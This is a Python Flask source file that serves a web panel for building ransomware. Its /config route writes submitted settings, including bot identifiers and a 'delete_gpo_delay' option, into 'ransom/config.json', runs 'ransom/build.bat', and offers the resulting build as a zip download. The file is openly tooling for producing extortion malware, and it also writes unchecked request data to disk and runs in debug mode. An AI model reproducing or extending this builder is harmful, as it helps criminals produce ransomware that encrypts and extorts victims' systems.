import os
from flask import Flask, render_template, request, send_from_directory, abort, jsonify
import re
import subprocess
import shutil

buildfolder = "www/"
app = Flask(__name__, template_folder=buildfolder )

@app.route("/")
def get_root():
    return render_template("index.html")

@app.route('/<path:path>')
def serve_file(path=''):
    file_path = os.path.join(buildfolder, path)

    if os.path.isfile(file_path):
        return send_from_directory(buildfolder, path)
    elif os.path.isdir(file_path):
        index_path = os.path.join(file_path, 'index.html')
        if os.path.isfile(index_path):
            return send_from_directory(file_path, 'index.html')
    abort(404)

@app.route("/config", methods=["POST"])
def config():
    with open("test.json", "w") as f:
        f.write(request.get_data().decode('utf-8'))
    with open("test.json", "r") as r:
        content = r.read()
    content = re.sub(r'"delete_gpo_delay":"(\d+)"', r'"delete_gpo_delay":\1', content)
    content = content.replace('{"config":{', '{"bot":{"uid":"00000000000000000000000000000000","key":"00000000000000000000000000000000"},"config":{')
    content = content.replace('":"on"', '":true').replace('":"off"', '":false')
    with open("ransom/config.json", "w") as f:
        f.write(content)
    os.remove("test.json")
    subprocess.run(["ransom/build.bat"])
    shutil.make_archive("www/build", 'zip', "ransom/Build")
    response = {"message": "Data written to file"}
    return jsonify(response)
    


# FROM THIS POINT YOU CAN'T SETUP ROUTES ANYMORE AND THE FLASK SERVER WILL NOT RESTART
if __name__ == '__main__':
    app.run(debug=True, port="9999")